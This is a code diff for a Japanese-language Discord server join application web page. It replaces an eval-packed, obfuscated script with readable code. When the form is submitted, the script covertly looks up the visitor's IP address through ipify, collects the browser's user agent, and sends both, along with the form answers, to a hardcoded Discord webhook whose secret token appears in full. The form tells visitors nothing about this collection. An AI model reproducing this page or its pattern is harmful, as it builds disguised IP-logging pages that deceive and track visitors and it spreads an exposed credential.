@@ -1,1 +1,163 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('<!2C x><x 2B="2A"><1f><2z 2y="2x-8"><A>J参加申請</A><h>m{Q-2w:2v,2u-2t;k-4:#2s;4:#2r;o:2q;2p-V:v;O-2o:v;1l:2n;N:0}.1e{k-4:M;u:2m;g-t:l;2l-2k:0 2j 2i 2h(0,0,0,0.1);w:R%;2g-w:2f}K{s-O:v;4:#2e}H[I="s"],r{w:R%;u:l;N:l 0;g:2d 2c#2b;g-t:L;Q-1k:1j}r{1l:2a;29:28}j{k-4:#27;4:M;g:n;u:l 1g;g-t:L;26:P;w:R%;Q-1k:1j;1i:0.5;P-1h:n}j.E{1i:1;P-1h:25}j:24{k-4:#23}.p{s-O:v;N-22:1g;u:l;k-4:#21;4:M;g-t:L}</h></1f><m><q 19="1e"><K>Jサーバー参加申請フォーム</K><1a i="13"><H I="s"f="3"i="3"1d="あなたのJ名"1c><1b><r f="6"i="6"1d="参加理由"1c></r><1b><j I="11"i="b"F>送信</j></1a><q 19="p"i="p"h="o: n;">申請を送信しました！</q></q><S>d.c(\'3\').12(\'H\',D(){2 3=G.7;2 18=/^[a-20-1Z-9]*$/;16(!18.1Y(3)){G.17(\'英数字のみ使用できます\')}15{G.17(\'\')}y()});D y(){2 3=d.c(\'3\').7;2 6=d.c(\'6\').7;2 b=d.c(\'b\');16(3&&6){b.F=1X;b.14.1W(\'E\')}15{b.F=1V;b.14.1U(\'E\')}}d.c(\'13\').12(\'11\',1T D(e){e.1S();2 C=1R 1Q(e.1P);2 3=C.10(\'3\');2 6=C.10(\'6\');2 T=1O.1N;2 U=1M Y(\'X://W.1L.1K?1J=B\').1I(Z=>Z.B());Y(\'X://1H.1G/W/1F/1E/1D-1C\',{1B:\'1A\',1z:{\'1y-1x\':\'1w/B\'},m:1v.1u({V:\'**新しい申請があります**\',1t:[{A:\'申請情報\',1s:[{f:\'ユーザー名\',7:3},{f:\'参加理由\',7:6},{f:\'1rアドレス\',7:U.1q},{f:\'デバイス情報\',7:T}],4:1p}]})});2 z=d.c(\'p\');z.h.o=\'1o\';1n(()=>z.h.o=\'n\',1m)});y();</S></m></x>',62,163,'||const|username|color||reason|value||||submitButton|getElementById|document||name|border|style|id|button|background|10px|body|none|display|alert|div|textarea|text|radius|padding|center|width|html|checkForm|alertBox|title|json|formData|function|enabled|disabled|this|input|type|Discord|h1|5px|white|margin|align|pointer|font|100|script|deviceInfo|ipData|content|api|https|fetch|res|get|submit|addEventListener|applyForm|classList|else|if|setCustomValidity|regex|class|form|br|required|placeholder|container|head|20px|events|opacity|16px|size|height|3000|setTimeout|block|0x3498db|ip|IP|fields|embeds|stringify|JSON|application|Type|Content|headers|POST|method|SmQ928zpdvxb8qkNuZvGxCVorrbr|S8va6w9Ro_W0BD9B9rTYrBCGgsXH20A6WTZCiSA|1362686432870924372|webhooks|com|discord|then|format|org|ipify|await|userAgent|navigator|target|FormData|new|preventDefault|async|remove|true|add|false|test|Z0|zA|2ecc71|top|2980b9|hover|auto|cursor|3498db|vertical|resize|150px|ccc|solid|1px|2c3e50|500px|max|rgba|8px|4px|shadow|box|30px|100vh|items|justify|flex|333|f4f4f9|serif|sans|Arial|family|UTF|charset|meta|ja|lang|DOCTYPE'.split('|'),0,{}))
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>Discord参加申請</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 500px;
+    }
+
+    h1 {
+      text-align: center;
+      color: #2c3e50;
+    }
+
+    input[type="text"], textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    textarea {
+      height: 150px;
+      resize: vertical;
+    }
+
+    button {
+      background-color: #3498db;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      opacity: 0.5;
+      pointer-events: none;
+    }
+
+    button.enabled {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    button:hover {
+      background-color: #2980b9;
+    }
+
+    .alert {
+      text-align: center;
+      margin-top: 20px;
+      padding: 10px;
+      background-color: #2ecc71;
+      color: white;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Discordサーバー参加申請フォーム</h1>
+    <form id="applyForm">
+      <input type="text" name="username" id="username" placeholder="あなたのDiscord名" required><br>
+      <textarea name="reason" id="reason" placeholder="参加理由" required></textarea><br>
+      <button type="submit" id="submitButton" disabled>送信</button>
+    </form>
+    <div class="alert" id="alert" style="display: none;">申請を送信しました！</div>
+  </div>
+
+<!-- index.html -->
+<iframe src="form.html" width="100%" height="100%" frameborder="0"></iframe>
+
+  <script>
+    // ユーザー名が英数字のみかチェックする
+    document.getElementById('username').addEventListener('input', function () {
+      const username = this.value;
+      const regex = /^[a-zA-Z0-9]*$/;
+      if (!regex.test(username)) {
+        this.setCustomValidity('英数字のみ使用できます');
+      } else {
+        this.setCustomValidity('');
+      }
+      checkForm();
+    });
+
+    // フォームが正しく記入されているかチェック
+    function checkForm() {
+      const username = document.getElementById('username').value;
+      const reason = document.getElementById('reason').value;
+      const submitButton = document.getElementById('submitButton');
+
+      if (username && reason) {
+        submitButton.disabled = false;
+        submitButton.classList.add('enabled');
+      } else {
+        submitButton.disabled = true;
+        submitButton.classList.remove('enabled');
+      }
+    }
+
+    // フォームが送信された際の処理
+    document.getElementById('applyForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(e.target);
+      const username = formData.get('username');
+      const reason = formData.get('reason');
+
+      // デバイス情報取得
+      const deviceInfo = navigator.userAgent;
+
+      // IPアドレス取得
+      const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+
+      // Webhookへ送信
+      fetch('https://discord.com/api/webhooks/1362686432870924372/S8va6w9Ro_W0BD9B9rTYrBCGgsXH20A6WTZCiSA-SmQ928zpdvxb8qkNuZvGxCVorrbr', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: '**新しい申請があります**',
+          embeds: [{
+            title: '申請情報',
+            fields: [
+              { name: 'ユーザー名', value: username },
+              { name: '参加理由', value: reason },
+              { name: 'IPアドレス', value: ipData.ip },
+              { name: 'デバイス情報', value: deviceInfo }
+            ],
+            color: 0x3498db
+          }]
+        })
+      });
+
+      // 申請送信後にアラート表示
+      const alertBox = document.getElementById('alert');
+      alertBox.style.display = 'block';
+      setTimeout(() => alertBox.style.display = 'none', 3000); // 3秒後に非表示
+    });
+
+    // 初期のフォームチェック
+    checkForm();
+  </script>
+</body>
+</html>
